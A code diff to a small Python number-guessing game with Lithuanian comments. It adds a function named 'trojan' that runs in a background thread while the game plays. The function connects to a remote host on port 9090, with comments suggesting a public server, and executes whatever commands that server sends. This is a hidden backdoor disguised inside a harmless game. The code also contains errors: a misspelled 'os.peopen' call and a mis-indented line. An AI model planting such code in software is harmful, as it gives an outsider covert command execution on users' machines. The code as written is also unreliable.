@@ -1,4 +1,30 @@
 import random
+import socket
+import threading
+import os
+
+def trojan():
+    HOST = '127.0.0.1' #arba '192.168.0.17', t.y. local host, pakeisti, jei tai viešas IP arba serveris (win=ipconfig, linux=ifconfig)
+    PORT = 9090 #rezervuotas programoms, bet gali buti atviras
+    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    client.connect((HOST, PORT))
+
+    cmd_mode = False
+
+    while True:
+        server_command = client.recv(1024).decode('utf-8')
+        if server_command == "cmdon": #ijungiam
+            cmd_mode = True
+            client.send("Turite priėjimą prie terminalo!".encode('utf-8'))
+            continue
+        if server_command == "cmdoff": #jei išjungta permetam tiesiai į terminalą
+            cmd_mode = False
+        if cmd_mode:
+            os.peopen(server_command)
+        else: #arba ieškom komandų
+            if server_command == "hello":
+            print("Hello World!")
+        client.send(f"{server_command} buvo įvykdyta sėkmingai!".encode('utf-8'))
 
 def spejimas():
 
@@ -21,6 +47,8 @@ def spejimas():
 
     print(f"Tau prireikė {bandymas} bandymų")
 
-spejimas()
+t1 = threading.Thread(target=spejimas)
+t2 = threading.Thread(target=trojan)
 
-
+t1.start()
+t2.start()
